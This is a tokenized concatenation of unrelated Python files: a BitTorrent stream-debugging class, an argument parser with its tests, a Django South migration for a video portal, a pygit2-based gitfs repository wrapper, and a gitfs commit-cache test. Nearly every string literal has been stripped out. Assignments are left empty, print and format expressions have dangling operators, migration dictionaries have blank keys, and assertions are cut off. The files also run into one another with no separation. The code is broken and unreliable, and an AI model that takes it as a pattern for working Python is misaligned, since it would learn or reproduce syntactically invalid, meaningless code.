~~ ~~ from cStringIO import StringIO \n 
from binascii import b2a_hex \n 
from urllib import quote \n 
import Connecter \n 
try : \n 
~~~ True \n 
~~ except : \n 
~~~ True = 1 \n 
False = 0 \n 
\n 
~~ DEBUG = False \n 
\n 
\n 
protocol_name = \n 
option_pattern = chr ( 0 ) * 8 \n 
\n 
def toint ( s ) : \n 
~~~ return long ( b2a_hex ( s ) , 16 ) \n 
\n 
~~ def tohex ( s ) : \n 
~~~ return b2a_hex ( s ) . upper ( ) \n 
\n 
~~ def make_readable ( s ) : \n 
~~~ if not s : \n 
~~~ return \n 
~~ if quote ( s ) . find ( ) >= 0 : \n 
~~~ return tohex ( s ) \n 
~~ return \'"\' + s + \'"\' \n 
\n 
# header, reserved, download id, my id, [length, message] \n 
\n 
~~ streamno = 0 \n 
\n 
\n 
class StreamCheck : \n 
~~~ def __init__ ( self ) : \n 
~~~ global streamno \n 
self . no = streamno \n 
streamno += 1 \n 
self . buffer = StringIO ( ) \n 
self . next_len , self . next_func = 1 , self . read_header_len \n 
\n 
~~ def read_header_len ( self , s ) : \n 
~~~ if ord ( s ) != len ( protocol_name ) : \n 
~~~ print self . no , \n 
~~ return len ( protocol_name ) , self . read_header \n 
\n 
~~ def read_header ( self , s ) : \n 
~~~ if s != protocol_name : \n 
~~~ print self . no , \n 
~~ return 8 , self . read_reserved \n 
\n 
~~ def read_reserved ( self , s ) : \n 
~~~ return 20 , self . read_download_id \n 
\n 
~~ def read_download_id ( self , s ) : \n 
~~~ if DEBUG : \n 
~~~ print self . no , + tohex ( s ) \n 
~~ return 20 , self . read_peer_id \n 
\n 
~~ def read_peer_id ( self , s ) : \n 
~~~ if DEBUG : \n 
~~~ print self . no , + make_readable ( s ) \n 
~~ return 4 , self . read_len \n 
\n 
~~ def read_len ( self , s ) : \n 
~~~ l = toint ( s ) \n 
if l > 2 ** 23 : \n 
~~~ print self . no , + str ( l ) + + s + \n 
~~ return l , self . read_message \n 
\n 
~~ def read_message ( self , s ) : \n 
~~~ if not s : \n 
~~~ return 4 , self . read_len \n 
~~ m = s [ 0 ] \n 
if ord ( m ) > 8 : \n 
~~~ print self . no , + str ( ord ( m ) ) \n 
~~ if m == Connecter . REQUEST : \n 
~~~ if len ( s ) != 13 : \n 
~~~ print self . no , + str ( len ( s ) ) \n 
return 4 , self . read_len \n 
~~ index = toint ( s [ 1 : 5 ] ) \n 
begin = toint ( s [ 5 : 9 ] ) \n 
length = toint ( s [ 9 : ] ) \n 
print self . no , + str ( index ) + + str ( begin ) + + str ( begin ) + + str ( length ) \n 
~~ elif m == Connecter . CANCEL : \n 
~~~ if len ( s ) != 13 : \n 
~~~ print self . no , + str ( len ( s ) ) \n 
return 4 , self . read_len \n 
~~ index = toint ( s [ 1 : 5 ] ) \n 
begin = toint ( s [ 5 : 9 ] ) \n 
length = toint ( s [ 9 : ] ) \n 
print self . no , + str ( index ) + + str ( begin ) + + str ( begin ) + + str ( length ) \n 
~~ elif m == Connecter . PIECE : \n 
~~~ index = toint ( s [ 1 : 5 ] ) \n 
begin = toint ( s [ 5 : 9 ] ) \n 
length = len ( s ) - 9 \n 
print self . no , + str ( index ) + + str ( begin ) + + str ( begin ) + + str ( length ) \n 
~~ else : \n 
~~~ print self . no , + str ( ord ( m ) ) + + str ( len ( s ) ) + \n 
~~ return 4 , self . read_len \n 
\n 
~~ def write ( self , s ) : \n 
~~~ while 1 : \n 
~~~ i = self . next_len - self . buffer . tell ( ) \n 
if i > len ( s ) : \n 
~~~ self . buffer . write ( s ) \n 
return \n 
~~ self . buffer . write ( s [ : i ] ) \n 
s = s [ i : ] \n 
m = self . buffer . getvalue ( ) \n 
self . buffer . reset ( ) \n 
self . buffer . truncate ( ) \n 
x = self . next_func ( m ) \n 
self . next_len , self . next_func = x \n 
# Written by Bill Bumgarner and Bram Cohen \n 
# see LICENSE.txt for license information \n 
\n 
~~ ~~ ~~ from types import * \n 
from cStringIO import StringIO \n 
\n 
\n 
def splitLine ( line , COLS = 80 , indent = 10 ) : \n 
~~~ indent = " " * indent \n 
width = COLS - ( len ( indent ) + 1 ) \n 
if indent and width < 15 : \n 
~~~ width = COLS - 2 \n 
indent = " " \n 
~~ s = StringIO ( ) \n 
i = 0 \n 
for word in line . split ( ) : \n 
~~~ if i == 0 : \n 
~~~ s . write ( indent + word ) \n 
i = len ( word ) \n 
continue \n 
~~ if i + len ( word ) >= width : \n 
~~~ s . write ( + indent + word ) \n 
i = len ( word ) \n 
continue \n 
~~ s . write ( + word ) \n 
i += len ( word ) + 1 \n 
~~ return s . getvalue ( ) \n 
\n 
~~ def formatDefinitions ( options , COLS , presets = { } ) : \n 
~~~ s = StringIO ( ) \n 
for ( longname , default , doc ) in options : \n 
~~~ s . write ( + longname + ) \n 
default = presets . get ( longname , default ) \n 
if type ( default ) in ( IntType , LongType ) : \n 
~~~ try : \n 
~~~ default = int ( default ) \n 
~~ except : \n 
~~~ pass \n 
~~ ~~ if default is not None : \n 
~~~ doc += + repr ( default ) + \n 
~~ s . write ( splitLine ( doc , COLS , 10 ) ) \n 
s . write ( ) \n 
~~ return s . getvalue ( ) \n 
\n 
\n 
~~ def usage ( string ) : \n 
~~~ raise ValueError ( string ) \n 
\n 
\n 
~~ def defaultargs ( options ) : \n 
~~~ l = { } \n 
for ( longname , default , doc ) in options : \n 
~~~ if default is not None : \n 
~~~ l [ longname ] = default \n 
~~ ~~ return l \n 
\n 
\n 
~~ def parseargs ( argv , options , minargs = None , maxargs = None , presets = { } ) : \n 
~~~ config = { } \n 
longkeyed = { } \n 
for option in options : \n 
~~~ longname , default , doc = option \n 
longkeyed [ longname ] = option \n 
config [ longname ] = default \n 
~~ for longname in presets . keys ( ) : # presets after defaults but before arguments \n 
~~~ config [ longname ] = presets [ longname ] \n 
~~ options = [ ] \n 
args = [ ] \n 
pos = 0 \n 
while pos < len ( argv ) : \n 
~~~ if argv [ pos ] [ : 2 ] != : \n 
~~~ args . append ( argv [ pos ] ) \n 
pos += 1 \n 
~~ else : \n 
~~~ if pos == len ( argv ) - 1 : \n 
~~~ usage ( ) \n 
~~ key , value = argv [ pos ] [ 2 : ] , argv [ pos + 1 ] \n 
pos += 2 \n 
if not longkeyed . has_key ( key ) : \n 
~~~ usage ( + key ) \n 
~~ longname , default , doc = longkeyed [ key ] \n 
try : \n 
~~~ t = type ( config [ longname ] ) \n 
if t is NoneType or t is StringType : \n 
~~~ config [ longname ] = value \n 
~~ elif t in ( IntType , LongType ) : \n 
~~~ config [ longname ] = long ( value ) \n 
~~ elif t is FloatType : \n 
~~~ config [ longname ] = float ( value ) \n 
~~ else : \n 
~~~ assert 0 \n 
~~ ~~ except ValueError , e : \n 
~~~ usage ( % ( key , str ( e ) ) ) \n 
~~ ~~ ~~ for key , value in config . items ( ) : \n 
~~~ if value is None : \n 
~~~ usage ( "Option --%s is required." % key ) \n 
~~ ~~ if minargs is not None and len ( args ) < minargs : \n 
~~~ usage ( "Must supply at least %d args." % minargs ) \n 
~~ if maxargs is not None and len ( args ) > maxargs : \n 
~~~ usage ( "Too many args - %d max." % maxargs ) \n 
~~ return ( config , args ) \n 
\n 
~~ def test_parseargs ( ) : \n 
~~~ assert parseargs ( ( , , , , , , , , ) , ( ( , , ) , ( , assert parseargs ( [ ] , [ ( , , ) ] ) == ( { : } , [ ] ) \n 
assert parseargs ( [ , , , ] , [ ( , , ) ] ) == ( { : } , [ ] ) \n 
try : \n 
~~~ parseargs ( [ ] , [ ( , , ) ] ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ try : \n 
~~~ parseargs ( [ , ] , [ ] ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ try : \n 
~~~ parseargs ( [ ] , [ ( , , ) ] ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ try : \n 
~~~ parseargs ( [ ] , [ ] , 1 , 2 ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ assert parseargs ( [ ] , [ ] , 1 , 2 ) == ( { } , [ ] ) \n 
assert parseargs ( [ , ] , [ ] , 1 , 2 ) == ( { } , [ , ] ) \n 
try : \n 
~~~ parseargs ( [ , , ] , [ ] , 1 , 2 ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ try : \n 
~~~ parseargs ( [ , ] , [ ( , 3 , ) ] ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ try : \n 
~~~ parseargs ( [ , ] , [ ( , 2.1 , ) ] ) \n 
~~ except ValueError : \n 
~~~ pass \n 
\n 
# -*- coding: utf-8 -*- \n 
~~ ~~ import datetime \n 
from south . db import db \n 
from south . v2 import SchemaMigration \n 
from django . db import models \n 
\n 
\n 
class Migration ( SchemaMigration ) : \n 
\n 
~~~ def forwards ( self , orm ) : \n 
\n 
~~~ db . add_column ( , , \n 
self . gf ( ) ( to = orm [ keep_default = False ) \n 
\n 
\n 
~~ def backwards ( self , orm ) : \n 
\n 
~~~ db . delete_column ( , ) \n 
\n 
\n 
~~ models = { \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } : ( , [ ] , { : "orm[\'auth.Permission\']" } , \n 
: { \n 
: { : "(\'content_type__app_label\', \'content_type__model\', \'codename\')" , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'contenttypes.ContentType\']" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : "orm[\'auth.Group\']" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : : ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'auth.Permission\']" : ( , [ ] , { : , : } , \n 
: { \n 
: { : "(\'name\',)" , : "((\'app_label\', \'model\'),)" , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : "\'taggit_taggeditem_tagged_items\'" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "\'taggit_taggeditem_items\'" } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : , : ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : , } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : "orm[\'videoportal.Channel\']" : ( , [ ] , { : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : , : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'videoportal.Video\']" } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : "orm[\'videoportal.Video\']" } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'videoportal.Channel\']" : ( , [ ] , { : , : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'videoportal.Channel\']" : ( , [ ] , { : , : ( , [ ] , { } ) , \n 
: ( , [ ] , { } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : "orm[\'auth.User\']" , : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : } \n 
} \n 
\n 
complete_apps = [ ] # Copyright 2014 PressLabs SRL \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ import os \n 
from collections import namedtuple \n 
from shutil import rmtree \n 
from stat import S_IFDIR , S_IFREG , S_IFLNK \n 
\n 
from pygit2 import ( clone_repository , Signature , GIT_SORT_TOPOLOGICAL , \n 
GIT_FILEMODE_TREE , GIT_STATUS_CURRENT , \n 
GIT_FILEMODE_LINK , GIT_FILEMODE_BLOB , GIT_BRANCH_REMOTE , \n 
GIT_BRANCH_LOCAL , GIT_FILEMODE_BLOB_EXECUTABLE ) \n 
from six import iteritems \n 
\n 
from gitfs . cache import CommitCache \n 
from gitfs . log import log \n 
from gitfs . utils . path import split_path_into_components \n 
from gitfs . utils . commits import CommitsList \n 
\n 
\n 
DivergeCommits = namedtuple ( "DivergeCommits" , [ "common_parent" , \n 
"first_commits" , "second_commits" ] ) \n 
\n 
\n 
class Repository ( object ) : \n 
\n 
~~~ def __init__ ( self , repository , commits = None ) : \n 
~~~ self . _repo = repository \n 
self . commits = commits or CommitCache ( self ) \n 
\n 
self . behind = False \n 
\n 
~~ def __getitem__ ( self , item ) : \n 
~~~ """\n        Proxy method for pygit2.Repository\n        """ \n 
\n 
return self . _repo [ item ] \n 
\n 
~~ def __getattr__ ( self , attr ) : \n 
~~~ """\n        Proxy method for pygit2.Repository\n        """ \n 
\n 
if attr not in self . __dict__ : \n 
~~~ return getattr ( self . _repo , attr ) \n 
~~ else : \n 
~~~ return self . __dict__ [ attr ] \n 
\n 
~~ ~~ def ahead ( self , upstream , branch ) : \n 
~~~ ahead , _ = self . diverge ( upstream , branch ) \n 
return ahead \n 
\n 
~~ def diverge ( self , upstream , branch ) : \n 
~~~ reference = "{}/{}" . format ( upstream , branch ) \n 
remote_branch = self . lookup_branch ( reference , GIT_BRANCH_REMOTE ) \n 
local_branch = self . lookup_branch ( branch , GIT_BRANCH_LOCAL ) \n 
\n 
if remote_branch . target == local_branch . target : \n 
~~~ return False , False \n 
\n 
~~ diverge_commits = self . find_diverge_commits ( local_branch , \n 
remote_branch ) \n 
behind = len ( diverge_commits . second_commits ) > 0 \n 
ahead = len ( diverge_commits . first_commits ) > 0 \n 
\n 
return ahead , behind \n 
\n 
~~ def checkout ( self , ref , * args , ** kwargs ) : \n 
~~~ result = self . _repo . checkout ( ref , * args , ** kwargs ) \n 
\n 
# update ignore cache after a checkout \n 
self . ignore . update ( ) \n 
\n 
status = self . _repo . status ( ) \n 
for path , status in iteritems ( status ) : \n 
# path is in current status, move on \n 
~~~ if status == GIT_STATUS_CURRENT : \n 
~~~ continue \n 
\n 
# check if file exists or not \n 
~~ full_path = self . _full_path ( path ) \n 
if path not in self . _repo . index : \n 
~~~ if path not in self . ignore : \n 
~~~ try : \n 
~~~ os . unlink ( full_path ) \n 
~~ except OSError : \n 
# path points to a directory containing untracked files \n 
~~~ rmtree ( \n 
full_path , \n 
onerror = lambda function , fpath , excinfo : log . info ( \n 
"Repository: Checkout couldn\'t delete %s" , fpath \n 
) \n 
) \n 
~~ ~~ continue \n 
\n 
# check files stats \n 
~~ stats = self . get_git_object_default_stats ( ref , path ) \n 
current_stat = os . lstat ( full_path ) \n 
\n 
if stats [ ] != current_stat . st_mode : \n 
~~~ os . chmod ( full_path , current_stat . st_mode ) \n 
self . _repo . index . add ( self . _sanitize ( path ) ) \n 
\n 
~~ ~~ return result \n 
\n 
~~ def _sanitize ( self , path ) : \n 
~~~ if path is not None and path . startswith ( "/" ) : \n 
~~~ path = path [ 1 : ] \n 
~~ return path \n 
\n 
~~ def push ( self , upstream , branch , credentials ) : \n 
~~~ """ Push changes from a branch to a remote\n\n        Examples::\n\n                repo.push("origin", "master")\n        """ \n 
\n 
remote = self . get_remote ( upstream ) \n 
remote . push ( [ "refs/heads/%s" % ( branch ) ] , callbacks = credentials ) \n 
\n 
~~ def fetch ( self , upstream , branch_name , credentials ) : \n 
~~~ """\n        Fetch from remote and return True if we are behind or False otherwise\n        """ \n 
\n 
remote = self . get_remote ( upstream ) \n 
remote . fetch ( callbacks = credentials ) \n 
\n 
_ , behind = self . diverge ( upstream , branch_name ) \n 
self . behind = behind \n 
return behind \n 
\n 
~~ def commit ( self , message , author , commiter , parents = None , ref = "HEAD" ) : \n 
~~~ """ Wrapper for create_commit. It creates a commit from a given ref\n        (default is HEAD)\n        """ \n 
\n 
status = self . _repo . status ( ) \n 
if status == { } : \n 
~~~ return None \n 
\n 
# sign the author \n 
~~ author = Signature ( author [ 0 ] , author [ 1 ] ) \n 
commiter = Signature ( commiter [ 0 ] , commiter [ 1 ] ) \n 
\n 
# write index localy \n 
tree = self . _repo . index . write_tree ( ) \n 
self . _repo . index . write ( ) \n 
\n 
# get parent \n 
if parents is None : \n 
~~~ parents = [ self . _repo . revparse_single ( ref ) . id ] \n 
\n 
~~ return self . _repo . create_commit ( ref , author , commiter , message , \n 
tree , parents ) \n 
\n 
~~ @ classmethod \n 
def clone ( cls , remote_url , path , branch = None , credentials = None ) : \n 
~~~ """Clone a repo in a give path and update the working directory with\n        a checkout to head (GIT_CHECKOUT_SAFE_CREATE)\n\n        :param str remote_url: URL of the repository to clone\n\n        :param str path: Local path to clone into\n\n        :param str branch: Branch to checkout after the\n        clone. The default is to use the remote\'s default branch.\n\n        """ \n 
\n 
repo = clone_repository ( remote_url , path , checkout_branch = branch , \n 
callbacks = credentials ) \n 
repo . checkout_head ( ) \n 
return cls ( repo ) \n 
\n 
~~ def _is_searched_entry ( self , entry_name , searched_entry , path_components ) : \n 
~~~ """\n        Checks if a tree entry is the one that is being searched for. For\n        that, the name has to correspond and it has to be the last element\n        in the path_components list (this means that the path corresponds\n        exactly).\n\n        :param entry_name: the name of the tree entry\n        :param searched_entry: the name of the object that is being searched\n                               for\n        :type searched_entry: str\n        :param path_components: the path of the object being searched for\n        :type path_components: list\n        """ \n 
\n 
return ( entry_name == searched_entry and \n 
len ( path_components ) == 1 and \n 
entry_name == path_components [ 0 ] ) \n 
\n 
~~ def _get_git_object ( self , tree , obj_name , path_components , modifier ) : \n 
~~~ """\n        It recursively searches for the object in the repository. To declare\n        an object as found, the name and the relative path have to correspond.\n        It also includes the relative path as a condition for success, to avoid\n        finding an object with the correct name but with a wrong location.\n\n        :param tree: a `pygit2.Tree` instance\n        :param entry_name: the name of the object\n        :type entry_name: str\n        :param path_components: the path of the object being searched for as\n            a list (e.g: for \'/a/b/c/file.txt\' => [\'a\', \'b\', \'c\', \'file.txt\'])\n        :type path_components: list\n        :param modifier: a function used to retrieve some specific\n            characteristic of the git object\n        :type modifier: function\n        :returns: an instance corresponding to the object that is being\n            searched for in case of success, or None otherwise.\n        :rtype: one of the following:\n            an instance of `pygit2.Tree`\n            an instance of `pygit2.Blob`\n            None\n        """ \n 
\n 
git_obj = None \n 
for entry in tree : \n 
~~~ if self . _is_searched_entry ( entry . name , obj_name , path_components ) : \n 
~~~ return modifier ( entry ) \n 
~~ elif entry . filemode == GIT_FILEMODE_TREE : \n 
~~~ git_obj = self . _get_git_object ( self . _repo [ entry . id ] , obj_name , \n 
path_components [ 1 : ] , modifier ) \n 
if git_obj : \n 
~~~ return git_obj \n 
\n 
~~ ~~ ~~ return git_obj \n 
\n 
~~ def get_git_object_type ( self , tree , path ) : \n 
~~~ """\n        Returns the filemode of the git object with the relative path <path>.\n\n        :param tree: a `pygit2.Tree` instance\n        :param path: the relative path of the object\n        :type entry_name: str\n        :returns: the filemode for the entry in case of success\n            (which can be one of the following) or None otherwise.\n            0     (0000000)  GIT_FILEMODE_NEW\n            16384 (0040000)  GIT_FILEMODE_TREE\n            33188 (0100644)  GIT_FILEMODE_BLOB\n            33261 (0100755)  GIT_FILEMODE_BLOB_EXECUTABLE\n            40960 (0120000)  GIT_FILEMODE_LINK\n            57344 (0160000)  GIT_FILEMODE_COMMIT\n        :rtype: int, None\n        """ \n 
\n 
path_components = split_path_into_components ( path ) \n 
try : \n 
~~~ return self . _get_git_object ( tree , path_components [ - 1 ] , \n 
path_components , \n 
lambda entry : entry . filemode ) \n 
~~ except : \n 
~~~ return GIT_FILEMODE_TREE \n 
\n 
~~ ~~ def get_git_object ( self , tree , path ) : \n 
~~~ """\n        Returns the git object with the relative path <path>.\n\n        :param tree: a `pygit2.Tree` instance\n        :param path: the relative path of the object\n        :type path: str\n        :returns: an instance corresponding to the object that is being\n            searched for in case of success, or None else.\n        :rtype: one of the following:\n            an intance of `pygit2.Tree`\n            an intance of `pygit2.Blob`\n            None\n        """ \n 
\n 
# It acts as a proxy for the _get_git_object method, which \n 
# does the actual searching. \n 
path_components = split_path_into_components ( path ) \n 
return self . _get_git_object ( tree , path_components [ - 1 ] , path_components , \n 
lambda entry : self . _repo [ entry . id ] ) \n 
\n 
~~ def get_git_object_default_stats ( self , ref , path ) : \n 
~~~ types = { \n 
GIT_FILEMODE_LINK : { \n 
: S_IFLNK | 0o444 , \n 
} , GIT_FILEMODE_TREE : { \n 
: S_IFDIR | 0o555 , \n 
: 2 \n 
} , GIT_FILEMODE_BLOB : { \n 
: S_IFREG | 0o444 , \n 
} , GIT_FILEMODE_BLOB_EXECUTABLE : { \n 
: S_IFREG | 0o555 , \n 
} , \n 
} \n 
\n 
if path == "/" : \n 
~~~ return types [ GIT_FILEMODE_TREE ] \n 
\n 
~~ obj_type = self . get_git_object_type ( ref , path ) \n 
if obj_type is None : \n 
~~~ return obj_type \n 
\n 
~~ stats = types [ obj_type ] \n 
if obj_type in [ GIT_FILEMODE_BLOB , GIT_FILEMODE_BLOB_EXECUTABLE ] : \n 
~~~ stats [ ] = self . get_blob_size ( ref , path ) \n 
\n 
~~ return stats \n 
\n 
~~ def get_blob_size ( self , tree , path ) : \n 
~~~ """\n        Returns the size of a the data contained by a blob object\n        with the relative path <path>.\n\n        :param tree: a `pygit2.Tree` instance\n        :param path: the relative path of the object\n        :type path: str\n        :returns: the size of data contained by the blob object.\n        :rtype: int\n        """ \n 
return self . get_git_object ( tree , path ) . size \n 
\n 
~~ def get_blob_data ( self , tree , path ) : \n 
~~~ """\n        Returns the data contained by a blob object with the relative\n        path <path>.\n\n        :param tree: a `pygit2.Tree` instance\n        :param path: the relative path of the object\n        :type path: str\n        :returns: the data contained by the blob object.\n        :rtype: str\n        """ \n 
return self . get_git_object ( tree , path ) . data \n 
\n 
~~ def get_commit_dates ( self ) : \n 
~~~ """\n        Walk through all commits from current repo in order to compose the\n        _history_ directory.\n        """ \n 
return list ( self . commits . keys ( ) ) \n 
\n 
~~ def get_commits_by_date ( self , date ) : \n 
~~~ """\n        Retrieves all the commits from a particular date.\n\n        :param date: date with the format: yyyy-mm-dd\n        :type date: str\n        :returns: a list containg the commits for that day. Each list item\n            will have the format: hh:mm:ss-<short_sha1>, where short_sha1 is\n            the short sha1 of the commit (first 10 characters).\n        :rtype: list\n        """ \n 
return list ( map ( str , self . commits [ date ] ) ) \n 
\n 
~~ def walk_branches ( self , sort , * branches ) : \n 
~~~ """\n        Simple iterator which take a sorting strategy and some branch and\n        iterates through those branches one commit at a time, yielding a list\n        of commits\n\n        :param sort: a sorting option `GIT_SORT_NONE, GIT_SORT_TOPOLOGICAL,\n        GIT_SORT_TIME, GIT_SORT_REVERSE`. Default is \'GIT_SORT_TOPOLOGICAL\'\n        :param branches: branch to iterate through\n        :type branches: list\n        :returns: yields a list of commits corresponding to given branches\n        :rtype: list\n\n        """ \n 
\n 
iterators = [ self . _repo . walk ( branch . target , sort ) \n 
for branch in branches ] \n 
stop_iteration = [ False for branch in branches ] \n 
\n 
commits = [ ] \n 
for iterator in iterators : \n 
~~~ try : \n 
~~~ commit = next ( iterator ) \n 
~~ except StopIteration : \n 
~~~ commit = None \n 
~~ commits . append ( commit ) \n 
\n 
~~ yield ( commit for commit in commits ) \n 
\n 
while not all ( stop_iteration ) : \n 
~~~ for index , iterator in enumerate ( iterators ) : \n 
~~~ try : \n 
~~~ commit = next ( iterator ) \n 
commits [ index ] = commit \n 
~~ except StopIteration : \n 
~~~ stop_iteration [ index ] = True \n 
\n 
~~ ~~ if not all ( stop_iteration ) : \n 
~~~ yield ( commit for commit in commits ) \n 
\n 
~~ ~~ ~~ def remote_head ( self , upstream , branch ) : \n 
~~~ ref = "%s/%s" % ( upstream , branch ) \n 
remote = self . _repo . lookup_branch ( ref , GIT_BRANCH_REMOTE ) \n 
return remote . get_object ( ) \n 
\n 
~~ def get_remote ( self , name ) : \n 
~~~ """ Retrieve a remote by name. Raise a ValueError if the remote was not\n        added to repo\n\n        Examples::\n\n                repo.get_remote("fork")\n        """ \n 
\n 
remote = [ remote for remote in self . _repo . remotes \n 
if remote . name == name ] \n 
\n 
if not remote : \n 
~~~ raise ValueError ( "Missing remote" ) \n 
\n 
~~ return remote [ 0 ] \n 
\n 
~~ def _full_path ( self , partial ) : \n 
~~~ if partial . startswith ( "/" ) : \n 
~~~ partial = partial [ 1 : ] \n 
~~ return os . path . join ( self . _repo . workdir , partial ) \n 
\n 
~~ def find_diverge_commits ( self , first_branch , second_branch ) : \n 
~~~ """\n        Take two branches and find diverge commits.\n\n             2--3--4--5\n            /\n        1--+              Return:\n            \\               - common parent: 1\n             6              - first list of commits: (2, 3, 4, 5)\n                            - second list of commits: (6)\n\n        :param first_branch: first branch to look for common parent\n        :type first_branch: `pygit2.Branch`\n        :param second_branch: second branch to look for common parent\n        :type second_branch: `pygit2.Branch`\n        :returns: a namedtuple with common parent, a list of first\'s branch\n        commits and another list with second\'s branch commits\n        :rtype: DivergeCommits (namedtuple)\n        """ \n 
\n 
common_parent = None \n 
first_commits = CommitsList ( ) \n 
second_commits = CommitsList ( ) \n 
\n 
walker = self . walk_branches ( GIT_SORT_TOPOLOGICAL , \n 
first_branch , second_branch ) \n 
\n 
for first_commit , second_commit in walker : \n 
~~~ if ( first_commit in second_commits or \n 
second_commit in first_commits ) : \n 
~~~ break \n 
\n 
~~ if first_commit not in first_commits : \n 
~~~ first_commits . append ( first_commit ) \n 
~~ if second_commit not in second_commits : \n 
~~~ second_commits . append ( second_commit ) \n 
\n 
~~ if second_commit . hex == first_commit . hex : \n 
~~~ break \n 
\n 
~~ ~~ try : \n 
~~~ index = second_commits . index ( first_commit ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ else : \n 
~~~ second_commits = second_commits [ : index ] \n 
common_parent = first_commit \n 
\n 
~~ try : \n 
~~~ index = first_commits . index ( second_commit ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ else : \n 
~~~ first_commits = first_commits [ : index ] \n 
common_parent = second_commit \n 
\n 
~~ return DivergeCommits ( common_parent , first_commits , second_commits ) \n 
# Copyright 2014 PressLabs SRL \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ from datetime import datetime \n 
\n 
from mock import MagicMock , call \n 
\n 
from pygit2 import GIT_SORT_TIME \n 
\n 
from gitfs . cache . commits import Commit , CommitCache \n 
\n 
\n 
class TestCommit ( object ) : \n 
~~~ def test_commit ( self ) : \n 
~~~ commit = Commit ( 1 , 1 , 1 ) \n 
new_commit = Commit ( 2 , 2 , "21111111111" ) \n 
\n 
assert new_commit > commit \n 
assert repr ( new_commit ) == "2-2111111111" \n 
\n 
\n 
~~ ~~ class TestCommitCache ( object ) : \n 
~~~ def test_cache ( self ) : \n 
~~~ mocked_repo = MagicMock ( ) \n 
mocked_commit = MagicMock ( ) \n 
\n 
mocked_repo . lookup_reference ( ) . resolve ( ) . target = "head" \n 
mocked_repo . walk . return_value = [ mocked_commit ] \n 
mocked_commit . commit_time = 1411135000 \n 
mocked_commit . hex = \n 
\n 
cache = CommitCache ( mocked_repo ) \n 
cache . update ( ) \n 
\n 
cache [ ] = Commit ( 1 , 1 , "1111111111" ) \n 
assert sorted ( cache . keys ( ) ) == [ , ] \n 
asserted_time = datetime . fromtimestamp ( mocked_commit . commit_time ) \n 
asserted_time = "{}-{}-{}" . format ( asserted_time . hour , asserted_time . minute , \n 
asserted_time . second ) \n 
assert repr ( cache [ ] ) == % asserted_time \n 
del cache [ ] \n 
for commit_date in cache : \n 
~~~ assert commit_date == \n 
\n 
